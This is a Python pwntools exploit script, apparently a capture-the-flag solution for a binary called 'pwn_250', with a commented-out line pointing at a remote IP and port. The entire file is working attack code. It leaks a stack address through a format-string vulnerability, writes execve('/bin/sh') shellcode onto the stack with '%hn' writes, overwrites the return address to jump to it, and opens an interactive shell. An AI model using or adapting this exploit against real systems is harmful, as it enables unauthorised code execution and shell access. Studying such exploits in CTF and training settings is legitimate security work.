from pwn import *
from binascii import *

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = shellcode.ljust(40, 'A')

shellcode1 = u64(shellcode[:8])
shellcode2 = u64(shellcode[8:16])
shellcode3 = u64(shellcode[16:24])
shellcode4 = u64(shellcode[24:32])
shellcode5 = u64(shellcode[32:40])
mainebp = 0

r = process('./pwn_250')
#r = remote('58.220.29.80', 65534)

def leak_ebp():
	global mainebp
	print r.recvuntil("ey, who'are you?")
	r.sendline('nnnnnn')
	print r.recvuntil(">")
	r.sendline("2")
	r.sendline("%10$p")
	data = r.recvuntil("bye")
	print '-----------'
	print data
	start = data.find('0x')
	end = data.find('\n')
	end = data.find('\ngoodb')
	mainebp = data[start: end]
	mainebp = int(mainebp, 16)
	print '-----------'
	print 'mainebp =>',hex(mainebp)

def write(addr, cont):
	addr = hex(addr)
	addr = '0x' + addr[2:].rjust(16, '0')
	cont = hex(cont)
	cont = '0x' + cont[2:].rjust(16, '0')
	print 'addr',addr
	print 'cont',cont
	l = []
	l.append(str(int(cont[-4:], 16)))
	l.append(str(int(cont[-8:-4], 16)))
	l.append(str(int(cont[-12:-8], 16)))
	l.append(str(int(cont[-16:-12], 16)))
	addr = int(addr, 16)
	for i in range(4):
		print r.recvuntil(">")
		r.sendline('2')
		payload  = ''
		if l[i] == '0':
			pass
		else:
			payload += '%' + l[i] + 'x'
		payload += '%8$hn'
		payload  = payload.ljust(16, 'A') 
		payload += p64(addr + 2*i)
		r.sendline(payload)


leak_ebp()
write(mainebp+48, shellcode5)
write(mainebp+40, shellcode4)
write(mainebp+32, shellcode3)
write(mainebp+24, shellcode2)
write(mainebp+16, shellcode1)
write(mainebp+8, mainebp+16)





r.interactive()
